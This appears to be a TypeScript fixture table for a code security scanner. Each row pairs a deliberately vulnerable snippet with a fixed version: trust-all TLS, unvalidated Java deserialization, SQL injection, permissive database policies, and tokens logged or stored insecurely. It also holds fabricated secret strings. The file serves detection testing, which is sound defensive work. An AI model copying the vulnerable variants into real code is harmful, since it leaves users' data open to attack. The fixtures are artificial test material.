import type { CodeFile } from '../../lib/scanner-engine';

/**
 * Rule fixture table. Every case pairs a vulnerable fixture (`detects`) with the fixed
 * version of the same code (`ignores`). All `ruleIds` must fire on the first and none on
 * the second. Add a row when adding or fixing a rule.
 */
export interface RuleCase {
  ruleIds: number[];
  name: string;
  detects: CodeFile[];
  ignores: CodeFile[];
}

/**
 * Known scanner gaps, run as `todo` tests: they report but never fail CI.
 * When a fix makes one pass, move it into RULE_CASES.
 */
export interface KnownGap {
  ruleId: number | null;
  name: string;
  kind: 'false-positive' | 'false-negative';
  files: CodeFile[];
}

const f = (path: string, content: string): CodeFile[] => [{ path, content }];

// Fake credentials are assembled at runtime so secret scanners don't flag this file
const FAKE_STRIPE_LIVE = ['sk', 'live', '51HqLyjWDarjtT1zdp7dcXYZabcdEFGHijklMNOP'].join('_');
const FAKE_AWS_KEY = 'AKIA' + '2E0A8F3B244C9986';
const FAKE_GITHUB_PAT = 'ghp' + '_R4nd0mT0k3nV4lu3F0rT3st1ngPurp0s3sAb';

export const RULE_CASES: RuleCase[] = [
  {
    ruleIds: [1203],
    name: 'UI-INTERACT-03 dialog form without a focus trap; a hand-written Tab trap is fine',
    detects: f('components/InviteModal.tsx', 'export function InviteModal() {\n  return (\n    <div role="dialog" aria-modal="true">\n      <input name="email" />\n      <input name="name" />\n      <input name="team" />\n    </div>\n  );\n}\n'),
    ignores: f('components/InviteModal.tsx', "export function InviteModal() {\n  const onKey = (e: KeyboardEvent) => {\n    if (e.key !== 'Tab') return;\n    if (e.shiftKey && document.activeElement === first) { e.preventDefault(); last.focus(); }\n  };\n  return (\n    <div role=\"dialog\" aria-modal=\"true\" onKeyDown={onKey}>\n      <input name=\"email\" />\n      <input name=\"name\" />\n      <input name=\"team\" />\n    </div>\n  );\n}\n")
  },
  {
    ruleIds: [29742],
    name: 'BUG-109 text-xs input zooms on iOS; a stylesheet that sets form fields to 16px on phones fixes it',
    detects: f('components/search.tsx', 'export function Search() {\n  return <input type="text" className="w-full text-xs px-2" placeholder="Search" />;\n}\n'),
    ignores: [
      { path: 'components/search.tsx', content: 'export function Search() {\n  return <input type="text" className="w-full text-xs px-2" placeholder="Search" />;\n}\n' },
      { path: 'app/globals.css', content: '@media (max-width: 640px) {\n  input, select, textarea { font-size: 16px !important; }\n}\n' },
    ]
  },
  // ─── Real-incident corpus expansion (2026-10-14) ──────────────────────
  {
    ruleIds: [28924],
    name: 'JSF-24 origin regex in a variable without anchors; an anchored ^…$ pattern is fine',
    detects: f('server/app.ts', "const allowed = new RegExp(process.env.ALLOWED_ORIGIN || 'acme\\\\.com');\napp.use(cors({ origin: (origin, cb) => cb(null, allowed.test(origin || '')), credentials: true }));\n"),
    ignores: f('server/app.ts', "const allowed = /^https:\\/\\/(?:app\\.)?acme\\.com$/;\napp.use(cors({ origin: (origin, cb) => cb(null, allowed.test(origin || '')), credentials: true }));\n")
  },
  {
    ruleIds: [28016],
    name: 'NEXT-SB-16 one-line table with a role column users can update; column-level grants are fine',
    detects: f('supabase/migrations/2_profiles.sql', "create table public.profiles (id uuid primary key references auth.users, name text, role text default 'user');\nalter table public.profiles enable row level security;\ncreate policy \"users update own profile\" on public.profiles for update using (auth.uid() = id);\n"),
    ignores: f('supabase/migrations/2_profiles.sql', "create table public.profiles (id uuid primary key references auth.users, name text, role text default 'user');\nalter table public.profiles enable row level security;\ncreate policy \"users update own profile\" on public.profiles for update using (auth.uid() = id);\nrevoke update on public.profiles from authenticated;\ngrant update (name) on public.profiles to authenticated;\n")
  },
  {
    ruleIds: [28016],
    name: 'NEXT-SB-16 members update their own row (role included); an admin-only policy via EXISTS is fine',
    detects: f('supabase/migrations/3_members.sql', "create table public.tontine_members (\n  id uuid primary key,\n  group_id uuid not null,\n  user_id uuid not null,\n  role text not null default 'member'\n);\ncreate policy update_members on public.tontine_members for update using (\n  user_id = auth.uid() or exists (select 1 from public.tontine_members tm where tm.group_id = group_id and tm.user_id = auth.uid() and tm.role = 'admin')\n);\n"),
    ignores: f('supabase/migrations/3_members.sql', "create table public.group_members (\n  id uuid primary key,\n  group_id uuid not null,\n  user_id uuid not null,\n  role text not null default 'member'\n);\ncreate policy \"Group admins can manage members\" on public.group_members for all using (\n  exists (select 1 from public.group_members gm where gm.group_id = group_members.group_id and gm.user_id = auth.uid() and gm.role = 'admin')\n);\n")
  },
  // ─── False positives found on 30 AI-built apps (2026-10-14) ───────────
  {
    ruleIds: [3016],
    name: 'Production server without SIGTERM handling; a local dev server is fine',
    detects: f('backend/server.js', "const app = require('express')();\napp.get('/health', (req, res) => res.send('ok'));\napp.listen(process.env.PORT || 3000);\n"),
    ignores: f('dev-server.js', "const app = require('express')();\napp.get('/health', (req, res) => res.send('ok'));\napp.listen(3000, () => console.log('dev server on http://localhost:3000'));\n")
  },
  {
    ruleIds: [29701],
    name: 'SHIP-01 hardcoded localhost API URL; a ternary fallback after an env value is fine',
    detects: f('src/context/SocketContext.tsx', "export function connect() {\n  return io('http://localhost:3000', { withCredentials: true });\n}\n"),
    ignores: f('src/context/SocketContext.tsx', "export function connect() {\n  const envUrl = import.meta.env.VITE_API_BASE_URL;\n  const apiBase = envUrl && envUrl.trim() !== '' ? envUrl : 'http://localhost:3000';\n  return io(apiBase, { withCredentials: true });\n}\n")
  },
  {
    ruleIds: [8201],
    name: 'PRIVACY-01 password value logged; the word "password" in the message alone is fine',
    detects: f('src/services/auth.ts', "export async function login(email: string, password: string) {\n  console.log('login attempt', email, password);\n}\n"),
    ignores: f('src/services/auth.ts', "export async function check(error: unknown) {\n  console.error('Error checking password:', error);\n}\n")
  },
  {
    ruleIds: [29622],
    name: 'BUG-22 localStorage read while rendering a Next.js page; a Vite SPA page never renders on a server',
    detects: [{ path: 'package.json', content: '{ "dependencies": { "next": "15.0.0", "react": "19.0.0" } }\n' }, { path: 'pages/dashboard.tsx', content: "export default function Dashboard() {\n  const user = localStorage.getItem('user');\n  return <p>{user}</p>;\n}\n" }],
    ignores: [{ path: 'package.json', content: '{ "dependencies": { "react": "18.3.0", "vite": "5.0.0", "react-router-dom": "6.0.0" } }\n' }, { path: 'src/pages/Dashboard.tsx', content: "export default function Dashboard() {\n  const user = localStorage.getItem('user');\n  return <p>{user}</p>;\n}\n" }]
  },
  // ─── False positives found by scanning Zelsis itself (2026-10-14) ─────
  {
    ruleIds: [29702],
    name: 'SHIP-02 bare VERCEL_URL used as a URL; a variable later given https:// is fine',
    detects: f('lib/site-url.ts', "export const siteUrl = process.env.VERCEL_URL;\nexport const callback = new URL('/auth/callback', siteUrl);\n"),
    ignores: f('lib/site-url.ts', "const vercelUrl = process.env.VERCEL_URL;\nexport const siteUrl = vercelUrl ? `https://${vercelUrl}` : 'http://localhost:3000';\n")
  },
  {
    ruleIds: [29894],
    name: 'BUG-217 timingSafeEqual on unknown lengths; inside try/catch the RangeError is handled',
    detects: f('app/api/webhooks/route.ts', "export function verify(sig: string, expected: string) {\n  return crypto.timingSafeEqual(Buffer.from(sig), Buffer.from(expected));\n}\n"),
    ignores: f('app/api/webhooks/route.ts', "export function verify(sig: string, expected: string) {\n  try {\n    return crypto.timingSafeEqual(Buffer.from(sig), Buffer.from(expected));\n  } catch {\n    return false;\n  }\n}\n")
  },
  {
    ruleIds: [28007],
    name: 'NEXT-SB-07 SECURITY DEFINER write; revoked from clients in a later migration is fine',
    detects: f('supabase/migrations/1_quota.sql', 'create or replace function public.reserve_quota(p_user uuid)\nreturns void language plpgsql security definer as $$\nbegin\n  update public.profiles set scans_used = scans_used + 1 where id = p_user;\nend;\n$$;\n'),
    ignores: [
      { path: 'supabase/migrations/1_quota.sql', content: 'create or replace function public.reserve_quota(p_user uuid)\nreturns void language plpgsql security definer as $$\nbegin\n  update public.profiles set scans_used = scans_used + 1 where id = p_user;\nend;\n$$;\n' },
      { path: 'supabase/migrations/2_harden.sql', content: 'REVOKE EXECUTE ON FUNCTION public.reserve_quota(uuid) FROM PUBLIC, anon, authenticated;\n' },
    ]
  },
  {
    ruleIds: [29826],
    name: 'BUG-155 useSearchParams() result mutated; a new URL(...).searchParams copy is fine',
    detects: f('app/search/filters.tsx', "'use client';\nimport { useSearchParams } from 'next/navigation';\nexport function Filters() {\n  const searchParams = useSearchParams();\n  searchParams.set('page', '1');\n  return null;\n}\n"),
    ignores: f('app/search/filters.tsx', "'use client';\nimport { useSearchParams } from 'next/navigation';\nexport function Filters() {\n  const searchParams = useSearchParams();\n  const clean = new URL(window.location.href);\n  clean.searchParams.delete('page');\n  window.history.replaceState({}, '', clean.toString());\n  return searchParams.get('q');\n}\n")
  },
  {
    ruleIds: [29668],
    name: 'BUG-68 insert data used without checking; a guarded if (row?.id) is fine',
    detects: f('lib/projects.ts', "export async function createProject(name: string) {\n  const { data: row } = await supabase.from('projects').insert({ name }).select('id').single();\n  return row.id;\n}\n"),
    ignores: f('lib/projects.ts', "export async function createProject(name: string) {\n  let id: string | null = null;\n  const { data: row } = await supabase.from('projects').insert({ name }).select('id').maybeSingle();\n  if (row?.id) id = row.id;\n  return id;\n}\n")
  },
  {
    ruleIds: [7215],
    name: 'API-15 GET handler writes data; an OAuth callback that verifies state is fine',
    detects: f('app/api/v1/subscribe/route.ts', "export async function GET(req: Request) {\n  const url = new URL(req.url);\n  await supabase.from('subscribers').insert({ email: url.searchParams.get('email') });\n  return Response.json({ ok: true });\n}\n"),
    ignores: f('app/api/v1/github-app/setup/route.ts', "export async function GET(req: Request) {\n  const url = new URL(req.url);\n  const userId = verifyInstallState(url.searchParams.get('state') || '');\n  if (!userId) return new Response('bad state', { status: 400 });\n  await supabase.from('installations').upsert({ user_id: userId, installation_id: url.searchParams.get('installation_id') });\n  return Response.redirect('/dashboard');\n}\n")
  },
  {
    ruleIds: [29762],
    name: 'BUG-129 useSearchParams page with no Suspense; a default export that wraps it in <Suspense> is fine',
    detects: [{ path: 'package.json', content: '{ "dependencies": { "next": "16.0.0" } }\n' }, { path: 'app/search/page.tsx', content: "'use client';\nimport { useSearchParams } from 'next/navigation';\nexport default function SearchPage() {\n  const q = useSearchParams().get('q');\n  return <p>{q}</p>;\n}\n" }],
    ignores: [{ path: 'package.json', content: '{ "dependencies": { "next": "16.0.0" } }\n' }, { path: 'app/search/page.tsx', content: "'use client';\nimport { Suspense } from 'react';\nimport { useSearchParams } from 'next/navigation';\nexport default function SearchPage() {\n  return (\n    <Suspense fallback={null}>\n      <Results />\n    </Suspense>\n  );\n}\nfunction Results() {\n  const q = useSearchParams().get('q');\n  return <p>{q}</p>;\n}\n" }]
  },
  {
    ruleIds: [24103, 18013],
    name: 'CORE-03 / JAVA-SEC-03 request body deserialized; an allowlisting subclass is safe',
    detects: f('src/main/java/com/acme/web/ImportController.java', 'public Object load(HttpServletRequest request) throws Exception {\n    ObjectInputStream in = new ObjectInputStream(request.getInputStream());\n    return in.readObject();\n}\n'),
    ignores: f('src/main/java/com/acme/web/ImportController.java', 'class SafeInput extends ObjectInputStream {\n    SafeInput(InputStream in) throws IOException { super(in); }\n    @Override protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {\n        if (!ALLOWED.contains(desc.getName())) throw new InvalidClassException(desc.getName());\n        return super.resolveClass(desc);\n    }\n}\npublic Object load(HttpServletRequest request) throws Exception {\n    return new SafeInput(request.getInputStream()).readObject();\n}\n')
  },
  {
    ruleIds: [24103, 18013],
    name: 'CORE-03 / JAVA-SEC-03 deep clone of bytes the code just serialized is not untrusted input',
    detects: f('src/main/java/com/acme/util/SerializationHelper.java', 'public static Object fromString(String s) throws Exception {\n    byte[] data = Base64.getDecoder().decode(s);\n    return new ObjectInputStream(new ByteArrayInputStream(data)).readObject();\n}\npublic static String toString(Serializable o) throws Exception {\n    ByteArrayOutputStream baos = new ByteArrayOutputStream();\n    new ObjectOutputStream(baos).writeObject(o);\n    return Base64.getEncoder().encodeToString(baos.toByteArray());\n}\n'),
    ignores: f('src/main/java/com/acme/util/Cloner.java', 'public static <T> T deepCopy(T value) throws Exception {\n    ByteArrayOutputStream bytes = new ByteArrayOutputStream();\n    new ObjectOutputStream(bytes).writeObject(value);\n    return (T) new ObjectInputStream(new ByteArrayInputStream(bytes.toByteArray())).readObject();\n}\n')
  },
  // ─── Mobile (MOB-SEC-01..17) ──────────────────────────────────────────
  {
    ruleIds: [9301],
    name: 'MOB-SEC-01 token in SharedPreferences; saving screen state in a Bundle is not storage',
    detects: f('app/src/main/java/com/acme/auth/TokenStore.java', 'prefs.edit().putString("access_token", token).apply();\n'),
    ignores: f('app/src/main/java/com/acme/feed/FeedActivity.java', 'protected void onSaveInstanceState(Bundle outState) {\n    outState.putString("password", password);\n}\n')
  },
  {
    ruleIds: [9305],
    name: 'MOB-SEC-05 exported receiver with a custom action; system-only actions are fine',
    detects: f('app/src/main/AndroidManifest.xml', '<manifest xmlns:android="http://schemas.android.com/apk/res/android">\n  <application>\n    <receiver\n        android:name=".SyncReceiver"\n        android:exported="true">\n      <intent-filter>\n        <action android:name="com.acme.action.SYNC_NOW" />\n      </intent-filter>\n    </receiver>\n  </application>\n</manifest>\n'),
    ignores: f('app/src/main/AndroidManifest.xml', '<manifest xmlns:android="http://schemas.android.com/apk/res/android">\n  <application>\n    <receiver\n        android:name=".BootReceiver"\n        android:exported="true">\n      <intent-filter>\n        <action android:name="android.intent.action.BOOT_COMPLETED" />\n      </intent-filter>\n    </receiver>\n  </application>\n</manifest>\n')
  },
  {
    ruleIds: [9304],
    name: 'MOB-SEC-04 Android trust-all TrustManager and hostname verifier',
    detects: f('app/src/main/java/com/acme/net/Http.kt', 'class TrustAll : X509TrustManager {\n    override fun checkServerTrusted(chain: Array<X509Certificate>, authType: String) {}\n    override fun checkClientTrusted(chain: Array<X509Certificate>, authType: String) {}\n    override fun getAcceptedIssuers() = arrayOf<X509Certificate>()\n}\nval client = OkHttpClient.Builder().hostnameVerifier { _, _ -> true }.build()\n'),
    ignores: f('app/src/main/java/com/acme/net/Http.kt', 'val client = OkHttpClient.Builder()\n    .certificatePinner(CertificatePinner.Builder().add("api.acme.com", "sha256/AAAA").build())\n    .build()\n')
  },
  {
    ruleIds: [9304],
    name: 'MOB-SEC-04 iOS session delegate accepts any server trust',
    detects: f('Acme/Network/Session.swift', 'func urlSession(_ session: URLSession, didReceive challenge: URLAuthenticationChallenge, completionHandler: @escaping (URLSession.AuthChallengeDisposition, URLCredential?) -> Void) {\n    completionHandler(.useCredential, URLCredential(trust: challenge.protectionSpace.serverTrust!))\n}\n'),
    ignores: f('Acme/Network/Session.swift', 'func urlSession(_ session: URLSession, didReceive challenge: URLAuthenticationChallenge, completionHandler: @escaping (URLSession.AuthChallengeDisposition, URLCredential?) -> Void) {\n    guard let trust = challenge.protectionSpace.serverTrust, SecTrustEvaluateWithError(trust, nil) else { return completionHandler(.cancelAuthenticationChallenge, nil) }\n    completionHandler(.useCredential, URLCredential(trust: trust))\n}\n')
  },
  {
    ruleIds: [9306],
    name: 'MOB-SEC-06 WebView file-URL access enabled',
    detects: f('app/src/main/java/com/acme/HelpActivity.kt', 'webView.settings.javaScriptEnabled = true\nwebView.settings.allowUniversalAccessFromFileURLs = true\nwebView.loadUrl("file:///android_asset/help.html")\n'),
    ignores: f('app/src/main/java/com/acme/HelpActivity.kt', 'webView.settings.javaScriptEnabled = true\nwebView.loadUrl("https://appassets.androidplatform.net/assets/help.html")\n')
  },
  {
    ruleIds: [9309],
    name: 'MOB-SEC-09 Kotlin AES defaults to ECB',
    detects: f('app/src/main/java/com/acme/crypto/Box.kt', 'fun encrypt(key: SecretKey, data: ByteArray): ByteArray {\n    val cipher = Cipher.getInstance("AES")\n    cipher.init(Cipher.ENCRYPT_MODE, key)\n    return cipher.doFinal(data)\n}\n'),
    ignores: f('app/src/main/java/com/acme/crypto/Box.kt', 'fun encrypt(key: SecretKey, data: ByteArray): ByteArray {\n    val cipher = Cipher.getInstance("AES/GCM/NoPadding")\n    cipher.init(Cipher.ENCRYPT_MODE, key)\n    return cipher.iv + cipher.doFinal(data)\n}\n')
  },
  {
    ruleIds: [9310],
    name: 'MOB-SEC-10 deep-link URL loaded into a WebView',
    detects: f('app/src/main/java/com/acme/WebActivity.kt', 'override fun onCreate(savedInstanceState: Bundle?) {\n    super.onCreate(savedInstanceState)\n    val target = intent.dataString\n    webView.loadUrl(target!!)\n}\n'),
    ignores: f('app/src/main/java/com/acme/WebActivity.kt', 'override fun onCreate(savedInstanceState: Bundle?) {\n    super.onCreate(savedInstanceState)\n    val target = intent.data ?: return\n    if (target.scheme == "https" && target.host in setOf("acme.com", "help.acme.com")) webView.loadUrl(target.toString())\n}\n')
  },
  {
    ruleIds: [9311],
    name: 'MOB-SEC-11 manifest marked debuggable (debug source set is fine)',
    detects: f('app/src/main/AndroidManifest.xml', '<manifest xmlns:android="http://schemas.android.com/apk/res/android">\n    <application android:debuggable="true" android:label="Acme" />\n</manifest>\n'),
    ignores: f('app/src/debug/AndroidManifest.xml', '<manifest xmlns:android="http://schemas.android.com/apk/res/android">\n    <application android:debuggable="true" android:label="Acme" />\n</manifest>\n')
  },
  {
    ruleIds: [9312],
    name: 'MOB-SEC-12 token written to Logcat',
    detects: f('app/src/main/java/com/acme/auth/Login.kt', 'fun onLoggedIn(session: Session) {\n    Log.d(TAG, "logged in, token=${session.accessToken}")\n}\n'),
    ignores: f('app/src/main/java/com/acme/auth/Login.kt', 'fun onLoggedIn(session: Session) {\n    Log.d(TAG, "logged in as ${session.userId}")\n    if (BuildConfig.DEBUG) {\n        Log.d(TAG, "token=${session.accessToken}")\n    }\n}\n')
  },
  {
    ruleIds: [9312],
    name: 'MOB-SEC-12 iOS prints the auth token',
    detects: f('Acme/Auth/LoginViewModel.swift', 'func didLogin(_ session: Session) {\n    print("login ok \\(session.accessToken)")\n}\n'),
    ignores: f('Acme/Auth/LoginViewModel.swift', 'func didLogin(_ session: Session) {\n    print("login ok \\(session.userId)")\n}\n')
  },
  {
    ruleIds: [9318],
    name: 'MOB-SEC-18 password written to a plist file',
    detects: f('Acme/Storage/ProfileStore.swift', 'let data = NSMutableDictionary()\ndata.setValue(username, forKey: "username")\ndata.setValue(password, forKey: "password")\ndata.write(toFile: path, atomically: true)\n'),
    ignores: f('Acme/Storage/ProfileStore.swift', 'let data = NSMutableDictionary()\ndata.setValue(username, forKey: "username")\ndata.write(toFile: path, atomically: true)\ntry keychain.set(password, key: "password")\n')
  },
  {
    ruleIds: [9313],
    name: 'MOB-SEC-13 Keychain item accessible always',
    detects: f('Acme/Storage/Keychain.swift', 'let query: [String: Any] = [\n    kSecClass as String: kSecClassGenericPassword,\n    kSecAttrAccessible as String: kSecAttrAccessibleAlways,\n    kSecValueData as String: token,\n]\n'),
    ignores: f('Acme/Storage/Keychain.swift', 'let query: [String: Any] = [\n    kSecClass as String: kSecClassGenericPassword,\n    kSecAttrAccessible as String: kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly,\n    kSecValueData as String: token,\n]\n')
  },
  {
    ruleIds: [9314],
    name: 'MOB-SEC-14 SQLite rawQuery built by concatenation',
    detects: f('app/src/main/java/com/acme/db/NotesDao.kt', 'fun find(title: String): Cursor =\n    db.rawQuery("SELECT * FROM notes WHERE title = \'" + title + "\'", null)\n'),
    ignores: f('app/src/main/java/com/acme/db/NotesDao.kt', 'fun find(title: String): Cursor =\n    db.rawQuery("SELECT * FROM notes WHERE title = ?", arrayOf(title))\n')
  },
  {
    ruleIds: [9315],
    name: 'MOB-SEC-15 React Native token in AsyncStorage',
    detects: f('src/auth/session.ts', "import AsyncStorage from '@react-native-async-storage/async-storage';\nexport async function saveSession(token: string) {\n  await AsyncStorage.setItem('accessToken', token);\n}\n"),
    ignores: f('src/auth/session.ts', "import * as SecureStore from 'expo-secure-store';\nimport AsyncStorage from '@react-native-async-storage/async-storage';\nexport async function saveSession(token: string) {\n  await SecureStore.setItemAsync('accessToken', token);\n  await AsyncStorage.setItem('onboardingDone', 'true');\n}\n")
  },
  {
    ruleIds: [9316],
    name: 'MOB-SEC-16 world-readable preferences',
    detects: f('app/src/main/java/com/acme/Prefs.java', 'SharedPreferences prefs = context.getSharedPreferences("session", Context.MODE_WORLD_READABLE);\n'),
    ignores: f('app/src/main/java/com/acme/Prefs.java', 'SharedPreferences prefs = context.getSharedPreferences("session", Context.MODE_PRIVATE);\n')
  },
  {
    ruleIds: [9317],
    name: 'MOB-SEC-17 FileProvider root-path',
    detects: f('app/src/main/res/xml/file_paths.xml', '<paths>\n    <root-path name="root" path="." />\n</paths>\n'),
    ignores: f('app/src/main/res/xml/file_paths.xml', '<paths>\n    <cache-path name="shared" path="shared/" />\n</paths>\n')
  },
  {
    ruleIds: [28007],
    name: 'NEXT-SB-07 SECURITY DEFINER delete granted to clients; a guard helper (is_admin) counts as a caller check',
    detects: f('supabase/migrations/1_fn.sql', 'create or replace function public.delete_account(target uuid)\nreturns void language plpgsql security definer as $$\nbegin\n  delete from public.profiles where id = target;\nend;\n$$;\ngrant execute on function public.delete_account(uuid) to anon, authenticated;\n'),
    ignores: f('supabase/migrations/1_fn.sql', "create or replace function public.delete_account(target uuid)\nreturns void language plpgsql security definer as $$\nbegin\n  if not public.is_admin() then\n    raise exception 'admins only';\n  end if;\n  delete from public.profiles where id = target;\nend;\n$$;\ngrant execute on function public.delete_account(uuid) to authenticated;\n")
  },
  {
    ruleIds: [28806],
    name: 'GAP-06 admin header read in a repo where middleware sets it is not client-trusted',
    detects: [{ path: 'app/api/admin/stats/route.ts', content: "export async function GET(req: Request) {\n  if (req.headers.get('x-user-role') !== 'admin') return new Response('no', { status: 403 });\n  return Response.json({ ok: true });\n}\n" }, { path: 'package.json', content: '{ "dependencies": { "next": "15.0.0" } }\n' }],
    ignores: [{ path: 'app/api/admin/stats/route.ts', content: "export async function GET(req: Request) {\n  if (req.headers.get('x-user-role') !== 'admin') return new Response('no', { status: 403 });\n  return Response.json({ ok: true });\n}\n" }, { path: 'middleware.ts', content: "export async function middleware(req: NextRequest) {\n  const headers = new Headers(req.headers);\n  headers.set('x-user-role', await roleFromSession(req));\n  return NextResponse.next({ request: { headers } });\n}\n" }]
  },
  {
    ruleIds: [28834],
    name: "GAP-34 service role key in a 'use client' module",
    detects: f('app/billing/client.tsx', "'use client';\nimport { createClient } from '@supabase/supabase-js';\nexport const admin = createClient(process.env.NEXT_PUBLIC_SUPABASE_URL!, process.env.SUPABASE_SERVICE_ROLE_KEY!);\n"),
    ignores: f('app/billing/admin.ts', "import 'server-only';\nimport { createClient } from '@supabase/supabase-js';\nexport const admin = createClient(process.env.NEXT_PUBLIC_SUPABASE_URL!, process.env.SUPABASE_SERVICE_ROLE_KEY!);\n")
  },
  {
    ruleIds: [28835],
    name: 'GAP-35 next.config CORS wildcard with credentials',
    detects: f('next.config.js', "module.exports = { async headers() { return [{ source: '/api/:path*', headers: [\n  { key: 'Access-Control-Allow-Credentials', value: 'true' },\n  { key: 'Access-Control-Allow-Origin', value: '*' },\n] }]; } };\n"),
    ignores: f('next.config.js', "module.exports = { async headers() { return [{ source: '/api/:path*', headers: [\n  { key: 'Access-Control-Allow-Credentials', value: 'true' },\n  { key: 'Access-Control-Allow-Origin', value: 'https://app.example.com' },\n] }]; } };\n")
  },
  {
    ruleIds: [28836],
    name: 'GAP-36 user website rendered as href without a scheme check',
    detects: f('components/profile-card.tsx', 'export function Card({ profile }: { profile: { name: string; website: string } }) {\n  return <a href={profile.website}>{profile.name}</a>;\n}\n'),
    ignores: f('components/profile-card.tsx', "const safeUrl = (u: string) => (/^https?:/.test(u) ? u : '#');\nexport function Card({ profile }: { profile: { name: string; website: string } }) {\n  return <a href={safeUrl(profile.website)}>{profile.name}</a>;\n}\n")
  },
  {
    ruleIds: [28837],
    name: 'GAP-37 request body deep-merged with lodash',
    detects: f('src/routes/settings.js', "const _ = require('lodash');\napp.post('/settings', (req, res) => {\n  const settings = _.merge({}, defaults, req.body);\n  res.json(settings);\n});\n"),
    ignores: f('src/routes/settings.js', "const _ = require('lodash');\napp.post('/settings', (req, res) => {\n  const settings = _.merge({}, defaults, SettingsSchema.parse(req.body));\n  res.json(settings);\n});\n")
  },
  {
    ruleIds: [28838],
    name: 'GAP-38 FastAPI DELETE route without an auth dependency (user_id path param is not auth)',
    detects: f('app/api/routes/users.py', 'from fastapi import APIRouter, Depends\nrouter = APIRouter()\n\n@router.delete("/users/{user_id}")\ndef delete_user(user_id: int, db: Session = Depends(get_db)):\n    db.query(User).filter(User.id == user_id).delete()\n'),
    ignores: f('app/api/routes/alerts.py', 'from fastapi import APIRouter, Depends\nrouter = APIRouter()\n\n@router.delete("/{alert_id}")\nasync def delete_alert(\n    alert_id: str,\n    user_id: str = Depends(get_current_user_id),\n    db = Depends(get_db)\n):\n    await db.alerts.delete_one({"id": alert_id, "user_id": user_id})\n')
  },
  {
    ruleIds: [28833],
    name: 'GAP-33 SQL dump in the public folder (path-only entry, content not downloaded)',
    detects: f('public/backup.sql', ''),
    ignores: f('db/backup.sql', '')
  },
  {
    ruleIds: [28833],
    name: 'GAP-33 real env file in a nested static folder, not the shared example',
    detects: f('apps/web/static/.env.production', 'DATABASE_URL=postgres://x\n'),
    ignores: f('apps/web/static/.env.example', 'DATABASE_URL=\n')
  },
  // ─── Secrets ──────────────────────────────────────────────────────────
  {
    ruleIds: [1],
    name: 'Hardcoded API secret',
    detects: f('src/lib/openai.ts', 'export const key = "sk-proj-abcdefghijklmnopqrstuvwxyz123456";\n'),
    ignores: f('src/lib/openai.ts', 'export const key = process.env.OPENAI_API_KEY;\n')
  },
  {
    ruleIds: [1, 5010],
    name: 'Hardcoded Stripe live key',
    detects: f('lib/stripe.ts', `export const stripeKey = '${FAKE_STRIPE_LIVE}';\n`),
    ignores: f('lib/stripe.ts', 'export const stripeKey = process.env.STRIPE_SECRET_KEY;\n')
  },
  {
    ruleIds: [5001],
    name: 'Hardcoded AWS access key',
    detects: f('config/aws.ts', `export const aws = { accessKeyId: '${FAKE_AWS_KEY}' };\n`),
    ignores: f('config/aws.ts', 'export const aws = { accessKeyId: process.env.AWS_ACCESS_KEY_ID };\n')
  },
  {
    ruleIds: [5003],
    name: 'Hardcoded GitHub personal access token',
    detects: f('scripts/release.ts', `const token = '${FAKE_GITHUB_PAT}';\n`),
    ignores: f('scripts/release.ts', 'const token = process.env.GITHUB_TOKEN;\n')
  },
  {
    ruleIds: [5045],
    name: 'Private key block in source',
    detects: f('certs/key.ts', 'export const k = `-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA7\n-----END RSA PRIVATE KEY-----`;\n'),
    ignores: f('certs/key.ts', 'export const k = process.env.SIGNING_PRIVATE_KEY;\n')
  },
  {
    ruleIds: [36],
    name: 'Backend secret exposed via NEXT_PUBLIC_',
    detects: f('components/Pay.tsx', "'use client';\nconst key = process.env.NEXT_PUBLIC_STRIPE_SECRET_KEY;\nexport default function Pay() { return <div>{key}</div>; }\n"),
    ignores: f('lib/supabase-admin.ts', "import 'server-only';\nimport { createClient } from '@supabase/supabase-js';\nexport const admin = createClient(process.env.NEXT_PUBLIC_SUPABASE_URL!, process.env.SUPABASE_SERVICE_ROLE_KEY!);\n")
  },

  // ─── Database ─────────────────────────────────────────────────────────
  {
    ruleIds: [3],
    name: 'Permissive Supabase RLS policy',
    detects: f('supabase/migrations/001.sql', 'CREATE POLICY "all" ON profiles FOR ALL USING (true);\n'),
    ignores: f('supabase/migrations/001.sql', 'CREATE POLICY "own" ON profiles FOR SELECT USING (auth.uid() = user_id);\n')
  },
  {
    ruleIds: [3001, 6010],
    name: 'Table without Row Level Security',
    detects: f('supabase/migrations/002.sql', 'CREATE TABLE public.payments (id uuid primary key, user_id uuid, amount int);\n'),
    ignores: [
      { path: 'supabase/migrations/002.sql', content: 'CREATE TABLE public.payments (id uuid primary key, user_id uuid, amount int);\nALTER TABLE public.payments ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "own" ON public.payments FOR SELECT USING (auth.uid() = user_id);\n' },
      // SQL line comments and block comments containing CREATE TABLE are not real table definitions
      { path: 'supabase/migrations/003_comments.sql', content: '-- o baseline aplicado, e create table if not exists faz a reescrita virar no-op\n/* create table if not exists dummy (id int); */\nALTER TABLE public.payments ALTER COLUMN amount SET NOT NULL;\n' },
      // SQLite schemas in TypeScript or drizzle-orm are not Postgres RLS tables
      { path: 'packages/agent/src/session/schema.ts', content: 'import { sqliteTable, text } from "drizzle-orm/sqlite-core";\nconst sql = "CREATE TABLE IF NOT EXISTS chat_sessions (id TEXT PRIMARY KEY);";\n' },
      // Standalone Postgres schemas outside supabase directory in a multi-tenant monorepo
      { path: 'plugins/postgres/sql/bundles.sql', content: 'CREATE TABLE bundles (id serial primary key, name text);\n' }
    ]
  },
  {
    ruleIds: [3001],
    name: 'Supabase table without RLS (RLS enabled in a later migration counts)',
    detects: [
      { path: 'supabase/migrations/20240101_init.sql', content: 'CREATE TABLE public.invoices (id uuid primary key, user_id uuid);\n' },
      { path: 'supabase/config.toml', content: 'project_id = "demo"\n' }
    ],
    ignores: [
      { path: 'supabase/migrations/20240101_init.sql', content: 'CREATE TABLE public.invoices (id uuid primary key, user_id uuid);\n' },
      { path: 'supabase/migrations/20240201_rls.sql', content: 'ALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;\n' },
      { path: 'supabase/config.toml', content: 'project_id = "demo"\n' }
    ]
  },
  {
    ruleIds: [3021, 6043],
    name: 'SQL injection via template literal',
    detects: f('app/api/users/route.ts', "import { db } from '@/lib/db';\nexport async function GET(req: Request) {\n  const id = new URL(req.url).searchParams.get('id');\n  const rows = await db.query(`SELECT * FROM users WHERE id = ${id}`);\n  return Response.json(rows);\n}\n"),
